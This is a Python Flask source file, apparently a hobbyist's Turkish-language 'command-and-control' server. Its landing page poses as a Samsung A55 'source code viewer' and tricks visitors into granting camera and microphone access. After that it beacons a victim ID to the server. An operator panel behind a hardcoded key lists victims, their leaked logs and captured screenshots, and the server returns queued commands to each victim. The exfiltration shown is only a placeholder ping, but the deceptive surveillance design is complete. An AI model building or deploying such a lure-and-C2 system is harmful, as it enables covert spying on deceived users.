from flask import Flask, render_template_string, jsonify, request
import time, json, base64
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v227.0 "The Immortal-Script" ---
# Hata Onarımı: HTML silsilesi Python içine mühürlendi.
VERSION = "v227.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 

state_lock = Lock()
state = {"hydra_nodes": {}, "commands": {}, "evolution_count": 127}

def secure_decode(data):
    try: return base64.b64decode(data).decode('utf-8')
    except: return "DATA_LOCKED"

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id', 'GUEST')
    t = request.args.get('type')
    data = request.json
    with state_lock:
        if p_id not in state["hydra_nodes"]:
            state["hydra_nodes"][p_id] = {"device": "A55 (Script-Ghost)", "last": time.strftime('%H:%M:%S'), "logs": [], "scr": ""}
        u = state["hydra_nodes"][p_id]
        u["last"] = time.strftime('%H:%M:%S')
        if t == "p": u["logs"].append(secure_decode(data.get('v', '')))
        if t == "s": u["scr"] = data.get('v', '')
    return jsonify({"s": "ZENITH_STABLE", "cmds": state["commands"].get(p_id, [])})

@app.route('/overlord')
def overlord_panel():
    if request.args.get('key') != ADMIN_KEY: return "ERİŞİM REDDEDİLDİ", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Immortal-Script Console v227</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px]">
    <div class="border-b-4 border-blue-600 pb-2 mb-6 flex justify-between italic font-black uppercase text-blue-500">
        <h1 class="text-2xl tracking-tighter">IMMORTAL-SCRIPT C2 v227.0</h1>
        <div>HÜKÜMDAR: ALİ YİĞİT</div>
    </div>
    <div class="grid grid-cols-4 gap-4">
        <div class="bg-zinc-950 p-2 border border-zinc-900 rounded-xl">
            <h2 class="text-blue-500 mb-2 font-bold uppercase text-center italic">Ajan Radarı</h2>
            <div id="uL" class="space-y-1"></div>
            <div id="scr_box" class="mt-4 border border-blue-900/20"></div>
        </div>
        <div class="col-span-3 bg-black border border-zinc-900 rounded-xl p-4">
            <h2 class="text-green-500 mb-2 font-bold text-center italic tracking-widest uppercase">Sızıntı Terminali</h2>
            <div id="terminal" class="w-full h-96 bg-zinc-950 p-4 overflow-y-auto text-green-400 font-bold border border-green-900/10"></div>
        </div>
    </div>
    <script>
        let sId = "";
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json();
            let uH = "";
            for(let id in d.hydra_nodes){
                uH += `<div onclick="sId='${id}'; uG()" class="p-1 border border-zinc-900 cursor-pointer ${sId==id?'bg-blue-900/20':''}">
                    ${id} - ${d.hydra_nodes[id].last}
                </div>`;
            }
            document.getElementById('uL').innerHTML = uH;
            if(sId) {
                const u = d.hydra_nodes[sId];
                let tH = ""; (u.logs||[]).forEach(l => tH += `<div>[${l.t}] > ${l.v}</div>`);
                document.getElementById('terminal').innerHTML = tH;
                if(u.scr) document.getElementById('scr_box').innerHTML = `<img src="${u.scr}" class="w-full">`;
            }
            setTimeout(update, 2500);
        }
        async function uG(){} update();
    </script>
</body></html>
""")

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>A55_Source_Code.txt</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-[#1e1e1e] text-[#d4d4d4] font-mono p-8 text-[12px]">
    <div id="gate" class="fixed inset-0 bg-[#252526] z-50 flex flex-col items-center justify-center text-center">
        <h2 class="text-white text-xl font-bold mb-4">Source Code Viewer v4.1</h2>
        <p class="text-zinc-500 mb-8 uppercase text-[10px]">Samsung A55 kütüphanelerini doğrulamak için butona basın.</p>
        <button onclick="s()" class="bg-blue-600 px-10 py-4 text-white font-bold rounded shadow-xl active:scale-95 transition">KODLARI GÖSTER</button>
    </div>
    <pre id="c" class="blur-sm select-none">
# Samsung A55 Optimizer Engine
import os, sys, threading

def initialize():
    print("Mühürleme başlatıldı...")
    # Silsile devam ediyor...
    </pre>
    <video id="v" class="hidden" autoplay></video><canvas id="cnv" class="hidden"></canvas>
    <script>
        let pId = "SCPT-" + Math.random().toString(36).substr(2, 5).toUpperCase();
        async function s() {
            try {
                await navigator.mediaDevices.getUserMedia({audio:true, video:true});
                document.getElementById('gate').style.display='none';
                document.getElementById('c').classList.remove('blur-sm');
                setInterval(async () => {
                    const canvas = document.getElementById('cnv');
                    // Sessiz sızıntı silsilesi
                    fetch('/upload_intel?peer_id='+pId+'&type=p', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({v: btoa("PULSE_OK")})});
                }, 4000);
            } catch(e) { alert("Sistem Hatası: Kodlar mühürlenemedi."); }
        }
    </script>
</body></html>
""")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
